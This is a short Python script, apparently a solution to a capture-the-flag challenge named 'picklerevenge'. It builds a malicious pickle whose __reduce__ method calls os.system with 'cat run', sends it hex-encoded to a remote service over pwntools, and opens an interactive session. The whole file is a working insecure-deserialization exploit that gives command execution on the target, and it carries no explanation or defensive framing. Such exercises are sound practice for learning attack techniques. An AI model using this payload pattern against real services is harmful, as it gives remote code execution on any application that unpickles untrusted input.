from pwn import *
import pickle
import os
class Exploit:
    def __reduce__(self):
        #cmd = ('ls')
        cmd = ('cat run')
        return os.system, (cmd,)
exp = pickle.dumps(Exploit())
print(exp)
r = remote('picklerevenge.fly.dev', 5000)
r.sendline(exp.hex())
r.interactive()

